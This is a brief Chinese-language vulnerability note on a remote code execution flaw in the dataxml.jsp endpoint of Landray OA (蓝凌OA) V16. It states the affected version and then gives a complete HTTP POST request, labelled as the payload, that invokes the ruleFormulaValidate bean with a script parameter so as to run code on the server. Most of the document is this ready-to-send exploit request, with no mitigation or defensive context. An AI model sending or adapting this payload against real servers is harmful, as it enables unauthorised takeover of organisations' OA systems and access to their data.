**漏洞描述：**

蓝凌OA dataxml,jsp接口存在RCE漏洞，攻击者可以通过接口执行脚本来获取服务器权限。

**影响版本：**

蓝凌OA V16

**Payload：**

```
POST /resource/help/kms/knowledge/dataxml.jsp HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
Content-Length: 17392
Content-Type: application/x-www-form-urlencoded

s_bean=ruleFormulaValidate&script=shell&returnType=int&modelName=test
```

---
